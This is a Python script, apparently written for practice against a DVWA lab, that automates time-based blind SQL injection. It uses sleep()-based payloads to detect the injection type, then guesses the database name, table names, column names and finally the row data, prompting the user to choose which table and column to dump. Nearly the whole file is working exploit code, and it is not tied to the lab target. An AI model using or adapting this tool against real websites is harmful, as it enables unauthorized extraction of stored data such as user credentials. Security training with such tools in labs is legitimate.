import sys
import requests
import re
from includee import judge_sql_time_inject
from includee import printf
from includee import get_header
dic = 'abcdefghijklmnopqrstuvwxyz1234567890'
# http://192.168.1.13/DVWA/vulnerabilities/sqli_blind/
# 1m0q1u2uldrbhfnbb9hqov8q80


def judge_time_type(url,headers): # 判断是否有注入点
    if judge_sql_time_inject("1'+and+sleep(3)%23",url,headers) == 1:
        printf("存在注入点，注入类型为字符型")
        return 1
    elif judge_sql_time_inject("1+and+sleep(3)%23",url,headers) == 1:
        printf("存在注入点，注入类型为数字型")
        return 2
    else:
        printf("存在错误，退出")
        return 0


def sql_time_attack(url,headers):
    if judge_time_type(url,headers) != 0:
        printf("开始注入...")
    else:
        quit()
    # 猜解数据库的长度
    # 1' and if(length(database())=4,sleep(3),1) #
    printf("正在猜解数据库长度...")
    for i in range(1,99):
        sql = f"1'+and+if(length(database())%3D{i}%2Csleep(3)%2C1)%23"
        # sql = f"1' and if(length(database())={i},sleep(3),1) #"
        if judge_sql_time_inject(sql, url, headers) == 1:
            databaselen = i
            break
    printf("数据库长度为"+str(databaselen))
    printf("正在猜解数据库名...")
    databbasename = ''
    for i in range(1,10):
        for j in dic:
            # 1' and if(ascii(substr(database(),1,1))=100,sleep(5),1)#
            tj = ord(j)
            sql = f"1'+and+if(ascii(substr(database()%2C{i}%2C1))%3D{tj}%2Csleep(3)%2C1)%23"
            # sql = f"1' and if(ascii(substr(database(),1,1))={tj},sleep(3),1)#"
            if judge_sql_time_inject(sql, url, headers) == 1:
                print(j)
                databbasename += j
                break
    printf("数据库名为:"+databbasename)
    printf("是否继续，y/N  ")
    n = input()
    if n == 'y' or n == 'Y':
        printf("正在继续")
    else:
        quit()
    printf("正在猜解数据库"+databbasename+"表信息...")
    # 1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)#
    for i in range(1,100):
        sql = f"1'+and+if((select+count(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+)%3D{i}%2Csleep(3)%2C1)%23"
        # sql = f"1' and if((select count(table_name) from information_schema.tables where table_schema=database())={i},sleep(5),1)#"
        if judge_sql_time_inject(sql,url,headers) == 1:
            table_num = i
            break
    printf("数据库"+databbasename+"共有"+str(table_num)+"张表")
    # 猜解表名
    printf("正在猜解表名...")
    table_name = []
    # 1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=103,sleep(5),1)#
    for i in range(table_num):
        table_tmp = ''
        for j in range(1,10):
            for k in dic:
                tk = ord(k)
                sql = f"1'+and+if(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{databbasename}'+limit+{i}%2C1)%2C{j}))%3D{tk}%2Csleep(2)%2C1)%23"
                if judge_sql_time_inject(sql,url,headers) == 1:
                    table_tmp += k
                    break
        if table_tmp != '':
            table_name.append(table_tmp)
    # 显示所有表信息
    printf("正在打印所有表信息...")
    print("\033[0;33m-\033[0m" * 20)
    j = 1
    for i in table_name:
        str1 = f'[{j}]'
        print(str1 + i)
        j += 1
    print("\033[0;33m-\033[0m" * 20)
    printf('请输入你想要查看的表名:')
    chose_table_name = input()
    # 猜解想要知道的表内的列信息
    printf("正在猜解表" + chose_table_name + "的信息...")
    # 猜解字段数 #ilggpqpf43ackmb3ndeh0o303r
    # 1' and if((select count(column_name) from information_schema.columns where table_name='users')=8,sleep(5),1)#
    for i in range(1,20):
        sql = f"1'+and+if((select+count(column_name)+from+information_schema.columns+where+table_schema%3Ddatabase()+and+table_name%3D'{chose_table_name}')%3D{i}%2Csleep(2)%2C1)%23"
        if judge_sql_time_inject(sql, url, headers) == 1:
            column_num = i
            break
    printf("表的字段数为:"+str(column_num))
    # 猜解字段长度
    # 1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7,sleep(5),1)#
    column_len = []
    for i in range(column_num):
        clen = 0
        for j in range(1,20):
            sql = f"1'+and+if(length(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{chose_table_name}'+limit+{i}%2C1)%2C1))%3D{j}%2Csleep(2)%2C1)%23"
            if judge_sql_time_inject(sql, url, headers):
                clen = j
                break
        if clen != 0:
            column_len.append(clen)
    # 猜解字段名
    printf("正在猜解字段名...")
    column_name = []
    for i in range(column_num):
        cstr = ''
        for j in range(column_len[i]):
            for k in dic:
                tk = ord(k)
                sql = f"1'+and+if(ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{chose_table_name}'+limit+{i}%2C1)%2C{j+1}))%3D{tk}%2Csleep(2)%2C1)%23"
                if judge_sql_time_inject(sql, url, headers) == 1:
                    cstr += k
                    break
        if cstr != '':
            column_name.append(cstr)
    printf("正在打印" + chose_table_name + "表的所有字段")
    print("\033[0;33m-\033[0m" * 20)
    num = 1
    for i in column_name:
        n = f"[{num}]"
        print(n + i)
        num += 1
    print("\033[0;33m-\033[0m" * 20)
    while True:
        printf("请选择想要查看的字段信息,退出请输入!q")
        column_in = input()
        if column_in == '!q':
            printf("注入结束")
            quit()
        else:
            data = []
            for i in range(5):
                str_tmp = ''
                for j in range(1, 20):
                    for k in dic:
                        tk = ord(k)
                        # 1' and if(ascii(substr((select user from users limit 1,1),1,1))=103,sleep(5),1)#
                        sql = f"1'+and+if(ascii(substr((select+{column_in}+from+{chose_table_name}+limit+{i}%2C1)%2C{j}%2C1))%3D{tk}%2Csleep(2)%2C1)%23"
                        if judge_sql_time_inject(sql,url,headers) == 1:
                            str_tmp += k
                            break
                if str_tmp != '':
                    data.append(str_tmp)
                    print(data)

            if len(data) != 0:
                printf("正在打印" + column_in)
                print("\033[0;33m-\033[0m" * 20)
                num = 1
                for i in data:
                    n = f"[{num}]"
                    print(n + i)
                    num += 1
                print("\033[0;33m-\033[0m" * 20)
            else:
                printf("无信息")